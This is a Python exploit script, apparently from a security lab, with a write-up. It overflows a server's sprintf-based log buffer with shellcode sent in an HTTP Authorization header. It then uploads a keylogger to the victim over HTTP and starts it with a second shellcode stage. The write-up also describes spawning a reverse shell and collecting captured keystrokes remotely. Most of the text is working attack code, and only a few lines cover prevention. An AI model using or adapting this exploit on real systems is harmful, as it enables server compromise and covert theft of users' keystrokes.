'''
[Exploit Overview]
This exploit launches ./keylogger with code injection.
The payload is injected through a buffer and exploits the bufferoverflow vulnerability to overwrite the return address.

The keylogger is installed and started using three payloads. The logged keyboard events can be curled by the attacker.

[Challenges & Decisions]
Challenge 1: installing the keylogger binary on the victim machine
  This can be achieved with two methods:

  Method 1: a) create a file with sys_creat.
            b) append the keylogger binary to this file. The buffer fits the whole keylogger binary.
            c) start the keylogger in the same way as scenario1
  Method 2: a) spawn a reverse shell
            b) curl and execute the keylogger

  The advantage of Method 2 is that you have full control over the server application with sudo rights. You can even change the password of the victim VM.

Challenge 2: accessing the logged keyboard events
 - The attacker can access the logged keyboard events with a curl like in the other exploits. This is possible because our exploit starts the keylogger
   in a separate process, which preserves the functionality of the server application after the attack.

[Execution Instructions]
1. Put the keylogger "keylogger" in the same directory as the exploit (on the attacker's machine)
2. Run the exploit. The python scripts executes three stages:
    - Stage 1: create a file named "keylog" on the victim with 777 (rwxrwxrwx) permissions
    - Stage 2: POST the keylogger binary to the {IP}:{PORT}/keylog file
    - Stage 3: launch a execve syscall on the attacker like in scenario 1
3. curl the logged keyboard events from the attacker's machine with curl http://{IP}:{PORT}/logged_keyboard_events.txt

[Vulnerability Discovery]
1. The buffer size increased from 0x500 to 0x500000. (not a vulnerability, but it fits the whole keylogger binary -> Method 1)
2. sprintf in C is considered unsafe as it lacks bounds checking, potentially leading to buffer overflows.

[Preventive Measures]
- Safer alternatives like snprintf should be used.
- Data Execution Prevention (mostly) prevents code injection unless disabled by the attacker.
- Although stack canaries and secure library function make code injection harder, they do not always prevent it outright.
'''

from pwn import *
import subprocess
import sys

if len(sys.argv) != 3:
    print("Usage: python script.py <target ip> <target port>")
    sys.exit(1)

log_buffer_rbp_offset = 0x450
log_buffer_prefix = 49
original_rbp = 0x7ffff75d1e20

context.encoding = "latin1"
TARGET = sys.argv[1]
TARGET_PORT = sys.argv[2]
shellcode = b""

with open("./shell-file", "rb") as file:
    for line in file.readlines():
        shellcode += line

shellcode_addr = 0x7ffff75cca93 # <- shellcode
formaat = "Request from " + "a" * 15 + " at fd a\n"
request = f"GET /data HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 511\r\nAuthorization: Basic%s\r\n\r\n"
request = request.encode('latin-1')
# shellcode_location = 0x7ffff75cc9d0 + len(f"== Request from {TARGET}" + " " * (15 - len(TARGET)) + f" at fd 4         \nGET /data HTTP/1.1\r\nHost: {TARGET}:{PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 511\r\nAuthorization: Basic")
offset = len(f"== Request from {TARGET}" + " " * (15 - len(TARGET)) + f" at fd 4         \nGET /data HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 511\r\nAuthorization: Basic")
shellcode_location = original_rbp - log_buffer_rbp_offset + offset
io = remote(TARGET, TARGET_PORT)
num_90 =  ((0x450 - len(formaat)) - (len(request) - 2)) - len(shellcode)
r1 = request.replace(b"%s", shellcode + b"\x90" * num_90 + p64(shellcode_location)[:-2]) # p64 zet om naar 8 bytes maar we hebben er 6 dus remove 2 laatste

io.send(r1)
io.close()

time.sleep(1)

command = f"curl -X POST --data-binary @keylogger http://{TARGET}:{TARGET_PORT}/keylog"
process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
output, error = process.communicate()

if error:
    print(f"Error while POSTing: {error}")
else:
    shellcode = b""
    
    with open("./shell-keylog", "rb") as file:
        for line in file.readlines():
            shellcode += line

    shellcode_addr = 0x7ffff75cca93 # <- shellcode
    formaat = "Request from " + "a" * 15 + " at fd a\n"
    request = f"GET /data HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 511\r\nAuthorization: Basic%s\r\n\r\n"
    request = request.encode('latin-1')
    # shellcode_location = 0x7ffff75cc9d0 + len(f"== Request from {TARGET}" + " " * (15 - len(TARGET)) + f" at fd 4         \nGET /data HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 511\r\nAuthorization: Basic")
    offset = len(f"== Request from {TARGET}" + " " * (15 - len(TARGET)) + f" at fd 4         \nGET /data HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 511\r\nAuthorization: Basic")
    shellcode_location = original_rbp - log_buffer_rbp_offset + offset
    io = remote(TARGET, TARGET_PORT)
    num_90 =  ((0x450 - len(formaat)) - (len(request) - 2)) - len(shellcode)
    r1 = request.replace(b"%s", shellcode + b"\x90" * num_90 + p64(shellcode_location)[:-2]) # p64 zet om naar 8 bytes maar we hebben er 6 dus remove 2 laatste

    io.send(r1)
    io.close()